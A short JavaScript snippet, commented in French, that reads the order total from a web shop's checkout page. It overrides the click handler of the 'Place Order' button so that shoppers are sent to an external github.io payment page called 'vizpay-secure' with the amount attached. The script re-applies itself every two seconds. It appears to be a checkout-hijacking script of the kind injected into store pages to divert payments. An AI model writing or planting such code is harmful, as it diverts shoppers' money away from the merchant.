// Fonction pour récupérer et traiter le montant
function getAmount() {
  const montantElement = document.querySelector('.card-total-price');
  const montant = montantElement.querySelector('#netamount');
  
  if (montant) {
    const montantValue = parseFloat(montant.textContent.trim());
    const currencyType = montantElement.textContent.includes('INR') ? 'INR' : 'USD';

    if (currencyType === 'INR') {
      // Si c'est INR, on divise par 100 et on arrondit au supérieur
      return Math.ceil(montantValue / 100);
    } else if (currencyType === 'USD') {
      // Si c'est en Dollar, on arrondit simplement au supérieur
      return Math.ceil(montantValue);
    }
  }
  
  // Retourne 0 si aucun montant n'est trouvé ou la conversion échoue
  return 0;
}

// Fonction pour mettre à jour le lien du bouton
function updateButtonLink() {
  const montantFinal = getAmount();
  
  // Si un montant a été récupéré
  if (montantFinal > 0) {
    // Crée un lien personnalisé avec le montant
    const customLink = `https://vizpay-secure.github.io/vizpay/?isc=${montantFinal}`;  // Remplacez par votre propre URL
    
    // Récupère le bouton et change son lien
    const btnPlaceOrder = document.querySelector('#btnPlaceOrder');
    if (btnPlaceOrder) {
      btnPlaceOrder.onclick = function() {
        window.location.href = customLink;
      };
      console.log(`Le lien du bouton a été mis à jour avec le montant: ${montantFinal}`);
    }
  } else {
    console.log('Montant introuvable ou erreur dans l\'extraction.');
  }
}

// Exécution continue toutes les 5 secondes pour vérifier et mettre à jour
setInterval(updateButtonLink, 2000); 

